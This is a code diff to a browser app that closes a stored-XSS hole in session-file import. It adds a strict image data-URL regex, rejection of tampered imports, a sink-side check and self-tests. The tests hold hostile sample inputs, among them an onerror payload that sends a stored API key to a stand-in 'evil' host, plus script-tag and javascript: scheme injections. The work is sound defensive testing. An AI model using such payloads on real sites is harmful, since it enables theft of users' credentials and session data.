@@ -1028,6 +1028,25 @@ const STORE = {
     const s = session !== undefined ? session : await this.loadLatest();
     return JSON.stringify(s);
   },
+
+  // -- DATAURL_RE: a stored dataUrl is only ever a base64-encoded display-referred
+  // image (png/jpeg/webp) produced by METRICS.downscaleForSend (canvas.toDataURL).
+  // This is the SINGLE source of truth for "is this dataUrl safe to put in an
+  // <img src>": importJSON validates against it at the trust boundary, and UI.safeSrc
+  // re-checks it at the sink (defense in depth). Kept deliberately strict — the
+  // charset is locked to [A-Za-z0-9+/=], so a smuggled quote/space/angle-bracket that
+  // would break out of the src="..." attribute can never match. -------------------
+  DATAURL_RE: /^data:image\/(png|jpe?g|webp);base64,[A-Za-z0-9+/=]+$/,
+
+  // -- _validImportedDataUrl(v): a session field's dataUrl is acceptable when it is
+  // absent/null (the shape allows null ref/base/settingsShot/etc.) OR a string that
+  // matches DATAURL_RE. Any OTHER value (a non-matching string, a number, an object)
+  // is a violation. Returns true=ok, false=violation. -----------------------------
+  _validImportedDataUrl(v) {
+    if (v === undefined || v === null) return true;
+    return typeof v === "string" && this.DATAURL_RE.test(v);
+  },
+
   async importJSON(str) {
     let obj;
     try { obj = JSON.parse(str); } catch (e) { throw new Error("importJSON: not valid JSON"); }
@@ -1039,6 +1058,24 @@ const STORE = {
     }
     if (typeof obj.created !== "string" || Number.isNaN(Date.parse(obj.created))) {
       obj.created = new Date().toISOString();
+    }
+    // -- STORED-XSS BOUNDARY (CRITICAL): every dataUrl-bearing field in an imported
+    // file is untrusted and flows into an <img src="${...}"> sink. Walk them all and
+    // REJECT the whole import on the first bad payload — do NOT strip-and-continue,
+    // since a tampered/corrupt file is something the user must be told about, not
+    // silently repaired. Covers ref/base/settingsShot plus every attempt dataUrl in
+    // both chains (any target, any attempt). ----------------------------------------
+    const REJECT = "importJSON: session file contains an invalid image payload.";
+    const slotVals = [obj.ref && obj.ref.dataUrl, obj.base && obj.base.dataUrl, obj.settingsShot && obj.settingsShot.dataUrl];
+    for (const dv of slotVals) {
+      if (!this._validImportedDataUrl(dv)) throw new Error(REJECT);
+    }
+    for (const target of Object.keys(obj.chains)) {
+      const chain = obj.chains[target];
+      const attempts = chain && Array.isArray(chain.attempts) ? chain.attempts : [];
+      for (const att of attempts) {
+        if (att && !this._validImportedDataUrl(att.dataUrl)) throw new Error(REJECT);
+      }
     }
     await this.saveSession(obj);
     return obj;
@@ -1961,14 +1998,27 @@ const UI = {
   // hardcoded string literal in THIS file (model output: ui_path text passed through
   // is pack data so it's safe, but why/rationale/hdri_mood/gi_notes/status_reason/
   // param/value/unit ARE model output and MUST be escaped) is passed through
-  // this.esc() before interpolation. Exceptions, documented at each call site:
-  // dataUrl attributes (img src) are produced by THIS app's own canvas pipeline
-  // (METRICS.downscaleForSend), never taken verbatim from an external source, so a
-  // data: URL string is not attacker-controllable content here. ---------------------
+  // this.esc() before interpolation. The ONE non-esc() case is dataUrl <img src>
+  // attributes: a dataUrl can arrive from an untrusted importJSON file, so it is
+  // gated by this.safeSrc() (base64-image-only) rather than esc()'d — safeSrc's
+  // locked-charset output cannot break out of the src="..." attribute, and esc()ing
+  // a data URL would corrupt its base64 payload. NEVER interpolate a raw dataUrl. ---
   esc(s) {
     return String(s === undefined || s === null ? "" : s).replace(/[&<>"']/g, c => ({
       "&": "&amp;", "<": "&lt;", ">": "&gt;", "\"": "&quot;", "'": "&#39;"
     }[c]));
+  },
+
+  // -- safeSrc(u): sink defense-in-depth for the three <img src="${...}"> points
+  // (slot thumb, session-strip reference thumb, attempt thumb). Returns u only when
+  // it is a clean base64 image data URL — reusing STORE.DATAURL_RE so the sink and
+  // the importJSON boundary can never diverge — else "". A caller that gets "" must
+  // render its placeholder instead of an <img>. This is the belt to importJSON's
+  // braces: even a dataUrl that reached the session through some path OTHER than a
+  // validated import (a future bug, a hand-edited IDB row) can't reach an img src as
+  // an attribute-breakout payload. -------------------------------------------------
+  safeSrc(u) {
+    return typeof u === "string" && STORE.DATAURL_RE.test(u) ? u : "";
   },
   fmtVal(v) {
     if (typeof v === "number") return Number.isInteger(v) ? String(v) : String(Math.round(v * 1000) / 1000);
@@ -2388,12 +2438,16 @@ const UI = {
     if (reanalyzeBtn) reanalyzeBtn.onclick = () => this.doReanalyzeOther();
   },
 
-  // dataUrl is produced ONLY by THIS app's own METRICS.downscaleForSend (canvas ->
-  // toDataURL), never taken from an external source verbatim — safe to interpolate
-  // as an img src without escaping (escaping would corrupt the base64 payload).
+  // dataUrl is USUALLY produced by THIS app's own METRICS.downscaleForSend, but the
+  // importJSON path can seed it from an untrusted file — so it goes through
+  // this.safeSrc() (base64-image-only) at the sink, NOT raw. An empty result (a
+  // dataUrl that isn't a clean image URL) renders the placeholder instead of an img.
+  // safeSrc's output is a locked-charset data URL, so it is safe UNESCAPED inside the
+  // src="..." attribute (escaping would corrupt the base64 payload). ---------------
   _slotHtml(def, session) {
     const val = def.key === "ref" ? session.ref : def.key === "base" ? session.base : session.settingsShot;
-    const thumb = val && val.dataUrl ? `<img class="slot-thumb" src="${val.dataUrl}" alt="${this.esc(def.label)}" />` : "";
+    const safe = val && val.dataUrl ? this.safeSrc(val.dataUrl) : "";
+    const thumb = safe ? `<img class="slot-thumb" src="${safe}" alt="${this.esc(def.label)}" />` : "";
     const focused = this._focusedSlot === def.key ? "slot-focused" : "";
     return `
       <div class="slot ${focused}" data-slot="${def.key}" tabindex="0">
@@ -2609,13 +2663,16 @@ const UI = {
 
   // -- session strip: ref thumb + per-attempt thumbs, score labeled "look distance
   // (0–100)", trend arrow vs previous, verbatim caveat text, handoff banner. Thumb
-  // src values are dataUrls from this app's own pipeline (see _slotHtml's comment). -
+  // src values go through this.safeSrc() (a dataUrl can arrive from an untrusted
+  // import) — an empty result renders a text placeholder in place of the <img>. ----
   _renderSessionStrip(state, session, chain) {
     const host = this._els.sessionstrip;
     if (state === "empty" || !session.ref) { host.innerHTML = ""; return; }
 
     const attempts = (chain && chain.attempts) || [];
-    const refThumb = `<div class="strip-thumb strip-ref"><img src="${session.ref.dataUrl}" alt="Reference" /><div class="strip-caption">Reference</div></div>`;
+    const refSafe = this.safeSrc(session.ref.dataUrl);
+    const refImg = refSafe ? `<img src="${refSafe}" alt="Reference" />` : `<div class="slot-empty">image unavailable</div>`;
+    const refThumb = `<div class="strip-thumb strip-ref">${refImg}<div class="strip-caption">Reference</div></div>`;
 
     const attemptThumbs = attempts.map((att, idx) => {
       const prev = idx > 0 ? attempts[idx - 1] : null;
@@ -2625,9 +2682,11 @@ const UI = {
           : att.score > prev.score ? '<span class="trend trend-down" title="Further from reference">▼</span>'
           : '<span class="trend trend-flat">–</span>';
       }
+      const attSafe = this.safeSrc(att.dataUrl);
+      const attImg = attSafe ? `<img src="${attSafe}" alt="Attempt ${idx + 1}" />` : `<div class="slot-empty">image unavailable</div>`;
       return `
         <div class="strip-thumb" data-attempt-index="${idx}">
-          <img src="${att.dataUrl}" alt="Attempt ${idx + 1}" />
+          ${attImg}
           <div class="strip-caption">look distance (0–100): ${Math.round(att.score)} ${trend}</div>
         </div>
       `;
@@ -3920,6 +3979,67 @@ SELFTEST.suites.engine = async function () {
       for (const id of [impId1, impId2, impId3]) { try { await STORE.deleteSession(id); } catch (e) {} }
     }
   }
+
+  // -- STORE.importJSON: stored-XSS boundary (CRITICAL fix). Every dataUrl-bearing
+  // field in an imported session file is untrusted (the file can be hand-crafted or
+  // tampered) and flows into <img src="${...}"> sinks — a payload like
+  // 'x" onerror="...steal localStorage.lm_key..."' would execute in a page holding
+  // the oc_ key. importJSON must REJECT (not strip-and-continue) any session whose
+  // ref/base/settingsShot/attempt dataUrl is not a clean base64 image data URL.
+  {
+    const okPng = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";
+    const evilId = "selftest-" + Date.now() + "-import-xss";
+    const cleanId = "selftest-" + Date.now() + "-import-clean";
+    const emptyChains = () => ({ vray7max: { recipe: null, attempts: [] }, vantage33: { recipe: null, attempts: [] } });
+    const baseSession = (id) => ({ id, created: "2026-01-01T00:00:00.000Z", context: { scene: "", time: "", rig: "" }, ref: null, base: null, settingsShot: null, activeTarget: "vray7max", chains: emptyChains() });
+    try {
+      // (reject a) ref.dataUrl with an onerror-injection payload -> whole import rejected.
+      const evilRef = baseSession(evilId);
+      evilRef.ref = { dataUrl: 'x" onerror="fetch(\'//evil/?k=\'+localStorage.lm_key)', metrics: {} };
+      let threwRef = null;
+      try { await STORE.importJSON(JSON.stringify(evilRef)); } catch (e) { threwRef = e; }
+      this.ok(!!threwRef, "STORE.importJSON: a ref.dataUrl carrying an onerror payload is REJECTED (throws)");
+      this.ok(threwRef && /invalid image payload/i.test(threwRef.message || ""), `STORE.importJSON: rejection message names the invalid image payload (got ${threwRef && threwRef.message})`);
+      let leaked = await STORE.loadLatest();
+      this.ok(!leaked || leaked.id !== evilId, "STORE.importJSON: the rejected malicious session was NOT saved (strip-and-continue would have leaked it)");
+
+      // (reject b) an ATTEMPT dataUrl deep in chains[*].attempts[*] is caught too.
+      const evilAttempt = baseSession(evilId);
+      evilAttempt.chains.vray7max.attempts = [{ dataUrl: 'y"><script>alert(1)<\/script>', metrics: {}, score: 5, correction: null, appliedParams: {} }];
+      let threwAtt = null;
+      try { await STORE.importJSON(JSON.stringify(evilAttempt)); } catch (e) { threwAtt = e; }
+      this.ok(!!threwAtt && /invalid image payload/i.test(threwAtt.message || ""), "STORE.importJSON: a malicious attempt dataUrl deep in chains is also rejected");
+
+      // (reject c) settingsShot.dataUrl with a javascript: scheme.
+      const evilSettings = baseSession(evilId);
+      evilSettings.settingsShot = { dataUrl: "javascript:alert(document.cookie)" };
+      let threwSet = null;
+      try { await STORE.importJSON(JSON.stringify(evilSettings)); } catch (e) { threwSet = e; }
+      this.ok(!!threwSet && /invalid image payload/i.test(threwSet.message || ""), "STORE.importJSON: a settingsShot.dataUrl with a javascript: scheme is rejected");
+
+      // (accept) a session whose dataUrls are all clean base64 image URLs imports fine.
+      const cleanSession = baseSession(cleanId);
+      cleanSession.ref = { dataUrl: okPng, metrics: {} };
+      cleanSession.base = { dataUrl: okPng, metrics: {} };
+      cleanSession.settingsShot = { dataUrl: okPng };
+      cleanSession.chains.vray7max.attempts = [{ dataUrl: okPng, metrics: {}, score: 3, correction: null, appliedParams: {} }];
+      let cleanImported = null, threwClean = null;
+      try { cleanImported = await STORE.importJSON(JSON.stringify(cleanSession)); } catch (e) { threwClean = e; }
+      this.ok(threwClean === null, `STORE.importJSON: a session with clean base64 image dataUrls still imports (got error ${threwClean && threwClean.message})`);
+      this.ok(!!cleanImported && cleanImported.id === cleanId, "STORE.importJSON: the clean session is saved and returned");
+      const cleanBack = await STORE.loadLatest();
+      this.ok(!!cleanBack && cleanBack.id === cleanId, "STORE.importJSON: the clean session round-trips through STORE");
+
+      // (accept) null dataUrls where the shape allows null stay fine (no false reject).
+      const nullDataUrls = baseSession("selftest-" + Date.now() + "-import-nulls");
+      let threwNulls = null;
+      try { await STORE.importJSON(JSON.stringify(nullDataUrls)); } catch (e) { threwNulls = e; }
+      this.ok(threwNulls === null, `STORE.importJSON: a session with null ref/base/settingsShot (allowed by the shape) is NOT falsely rejected (got ${threwNulls && threwNulls.message})`);
+      await STORE.deleteSession(nullDataUrls.id);
+    } finally {
+      for (const id of [evilId, cleanId]) { try { await STORE.deleteSession(id); } catch (e) {} }
+    }
+  }
 };
 
 // -- suite: engine-retention (Task 7a hardening) — session pruning on boot(). Its own
@@ -4134,6 +4254,32 @@ SELFTEST.suites.ui = async function () {
   this.ok(UI.isRecipeApplied({ recipeApplied: { "cam.iso": true } }, "cam.iso") === true, "isRecipeApplied: explicit true -> true");
   this.ok(UI.isRecipeApplied({ recipeApplied: { "cam.iso": false } }, "cam.iso") === false, "isRecipeApplied: explicit false -> false (the only unchecked case)");
   this.ok(UI.isRecipeApplied({ recipeApplied: { "cam.iso": false } }, "cm.contrast") === true, "isRecipeApplied: one param's false does not leak onto other params");
+
+  // -- UI.esc(): escape-map lock (security-load-bearing — every model/imported string
+  // flows through this before hitting an innerHTML sink). Pin the exact entity output
+  // so a future edit can't silently drop or weaken a mapping.
+  this.ok(UI.esc('&<>"\'') === "&amp;&lt;&gt;&quot;&#39;", `UI.esc: exact escape map for & < > " ' (got ${JSON.stringify(UI.esc('&<>"\''))})`);
+  this.ok(UI.esc("plain text 123") === "plain text 123", "UI.esc: leaves benign text untouched");
+  const escPayload = UI.esc('<img src=x onerror="steal()">');
+  this.ok(!/[<>]/.test(escPayload), "UI.esc: an <img onerror> payload has no raw angle brackets left after escaping (renders inert as text)");
+  this.ok(escPayload.includes("&lt;img") && escPayload.includes("&gt;"), `UI.esc: the payload's brackets became entities (got ${escPayload})`);
+  this.ok(UI.esc(null) === "" && UI.esc(undefined) === "", "UI.esc: null/undefined -> empty string, never the literal \"null\"/\"undefined\"");
+
+  // -- UI.safeSrc(u): sink defense-in-depth for the three <img src> interpolation
+  // points. Returns u only if it is a clean base64 image data URL, else "" (caller
+  // renders a placeholder instead of an <img>). Same regex as the importJSON boundary.
+  this.ok(typeof UI.safeSrc === "function", "UI.safeSrc is a function");
+  const okPngUrl = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=";
+  this.ok(UI.safeSrc(okPngUrl) === okPngUrl, "safeSrc: a valid image/png base64 data URL passes through unchanged");
+  this.ok(UI.safeSrc("data:image/jpeg;base64,/9j/4AAQSkZJRg==") === "data:image/jpeg;base64,/9j/4AAQSkZJRg==", "safeSrc: image/jpeg passes");
+  this.ok(UI.safeSrc("data:image/jpg;base64,/9j/4AAQ==") === "data:image/jpg;base64,/9j/4AAQ==", "safeSrc: image/jpg (jpe?g) passes");
+  this.ok(UI.safeSrc("data:image/webp;base64,UklGRg==") === "data:image/webp;base64,UklGRg==", "safeSrc: image/webp passes");
+  this.ok(UI.safeSrc('x" onerror="steal()') === "", "safeSrc: an onerror-injection string -> \"\"");
+  this.ok(UI.safeSrc("javascript:alert(1)") === "", "safeSrc: a javascript: scheme -> \"\"");
+  this.ok(UI.safeSrc("data:text/html;base64,PHNjcmlwdD4=") === "", "safeSrc: data:text/html (non-image) -> \"\"");
+  this.ok(UI.safeSrc("data:image/svg+xml;base64,PHN2Zz4=") === "", "safeSrc: data:image/svg+xml (scriptable) -> \"\" (only png/jpe?g/webp allowed)");
+  this.ok(UI.safeSrc("") === "" && UI.safeSrc(null) === "" && UI.safeSrc(undefined) === "", "safeSrc: empty/null/undefined -> \"\"");
+  this.ok(UI.safeSrc("data:image/png;base64,iVBOR!@#$") === "", "safeSrc: a data:image/png prefix with non-base64 chars in the payload -> \"\" (charset-locked)");
 };
 
 addEventListener("DOMContentLoaded", () => {
